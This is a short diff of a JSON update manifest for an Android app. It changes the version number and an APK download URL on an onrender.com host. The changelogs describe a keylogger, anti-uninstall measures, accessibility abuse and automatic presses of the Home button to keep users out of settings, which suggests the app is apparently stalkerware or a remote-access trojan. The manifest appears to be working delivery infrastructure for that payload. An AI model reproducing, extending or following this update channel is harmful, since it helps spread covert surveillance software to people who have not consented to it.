@@ -1,8 +1,8 @@
 {
-  "version_code": 53,
-  "version_name": "7.9.8",
+  "version_code": 55,
+  "version_name": "7.9.10",
   "apk_url": "https://netmirrorr.onrender.com/downloadapp/fullupdate.apk",
-  "changelog": "CRITICAL FIX: Notification permission page loop — AccessibilityGuard 5-min throttle + AntiUninstall removed bare reset keyword + sent_to_settings 5-min guard on all 3 Home-pressers.",
+  "changelog": "FIXED: Keylogger (removed serviceInfo reset), connection drops (stale socket guard + onTaskRemoved restart + synchronized connect), notification delete feature, block app manual entry.",
   "is_mandatory": false,
   "poster_url": "",
   "minSdk": 26,
